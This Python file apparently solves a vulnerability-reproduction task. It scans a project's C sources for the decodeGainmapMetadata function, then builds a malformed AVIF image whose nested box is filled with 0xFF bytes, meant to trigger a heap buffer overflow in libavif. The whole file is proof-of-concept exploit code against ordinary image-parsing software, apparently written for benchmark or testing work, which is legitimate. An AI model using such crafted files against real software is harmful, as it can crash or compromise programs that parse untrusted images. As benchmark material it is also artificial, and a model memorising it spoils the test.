import struct
import os
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in decodeGainmapMetadata.
        """
        def p32(x):
            return struct.pack(">I", x)

        def box(box_type, payload):
            return p32(len(payload) + 8) + box_type + payload

        # Default target box type if not found in source
        target_box_type = b"tmap"

        # Static analysis: Search for the box type associated with decodeGainmapMetadata
        # The function is likely called within a switch/if block checking the box type (4CC).
        candidates = []
        for root, dirs, files in os.walk(src_path):
            for file in files:
                if file.endswith(".c"):
                    path = os.path.join(root, file)
                    try:
                        with open(path, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                        
                        if "decodeGainmapMetadata" in content:
                            # Look for the function call and preceding string literals
                            for match in re.finditer(r"decodeGainmapMetadata", content):
                                idx = match.start()
                                # Scan backwards up to 1000 chars for the triggering box type
                                snippet = content[max(0, idx-1000):idx]
                                # Find 4-character string literals (e.g. "avif", "tmap")
                                matches = re.findall(r'"([a-zA-Z0-9 ]{4})"', snippet)
                                if matches:
                                    # The literal closest to the call is the most likely candidate
                                    candidates.append(matches[-1])
                    except Exception:
                        pass
        
        if candidates:
            target_box_type = candidates[-1].encode("ascii")

        # Construct the AVIF PoC
        # Structure: FTYP + META [ HDLR + IPRP [ IPCO [ TARGET_BOX ] ] ]
        
        # 1. FTYP box
        ftyp = box(b"ftyp", b"avif" + p32(0) + b"mif1" + b"avif")
        
        # 2. HDLR box (Handler Reference)
        # FullBox: Ver(0) + Flags(0) + Predefined(0) + HandlerType('pict') + Reserved(0) + Name
        hdlr_payload = p32(0) + p32(0) + b"pict" + b"\x00" * 12 + b"libavif" + b"\x00"
        hdlr = box(b"hdlr", hdlr_payload)
        
        # 3. Malicious Box
        # Vulnerability: "subtraction between unsigned types" leading to OOB.
        # This typically happens when a length field in the payload is larger than the available data.
        # We simulate this by filling the payload with 0xFF, implying very large lengths if parsed as integer.
        # We assume the box is a FullBox (4 bytes header) followed by data.
        bad_payload = p32(0) + b"\xFF" * 20
        bad_box = box(target_box_type, bad_payload)
        
        # 4. IPCO (Item Property Container) and IPRP (Item Properties)
        ipco = box(b"ipco", bad_box)
        iprp = box(b"iprp", ipco)
        
        # 5. META box
        # FullBox: Ver(0) + Flags(0) + Children (hdlr, iprp)
        meta_payload = p32(0) + hdlr + iprp
        meta = box(b"meta", meta_payload)
        
        return ftyp + meta